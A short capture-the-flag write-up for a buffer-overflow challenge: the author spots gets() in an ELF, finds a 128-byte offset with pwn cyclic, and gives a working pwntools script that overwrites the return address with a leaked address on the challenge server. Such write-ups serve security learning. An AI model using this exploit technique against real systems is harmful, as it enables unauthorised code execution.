### Overflowing with files

Given chal, which is an ELF
run `readelf -s chal`, I'm looking for vulnerable functions in dynamic library or maybe some user-defined functions
There is gets function, so this is another buffer overflow problem.

Setup another pwned2.py, with same code structure as portal

Run the ELF, how nice that they give the address we need to give to rip (return instruction pointer), so in pwntools, read the input prompt, extract that hex address and put in into a payload

This time, I use `pwn cyclic 400` to generate a cyclic text, then run it in gdb (or gef), then `pwn cyclic -l <pattern>` where pattern is the thing that replaces the address in initial prompt. This gets the offset of 128.

Some manouvering with hex address and endianness, voila.

SECEDU{h0w_c4n_u_0v3rfl0w_with_0n3_f1le?}
```
from pwn import *

host = "chals.secedu.site"
port = 5001
offset = 128

elf = ELF("./chal")
# this for debugging purpose, real deal is remote()
# p = elf.process()
p = remote(host, port)

info = p.recv()
addr = info.split(b'\n')[0].split()[-1]
addr = int(addr.decode(), 16)
log.info(info)

payload = b'O' * offset + p32(addr)

p.sendline(payload)
log.success(p.recv())
```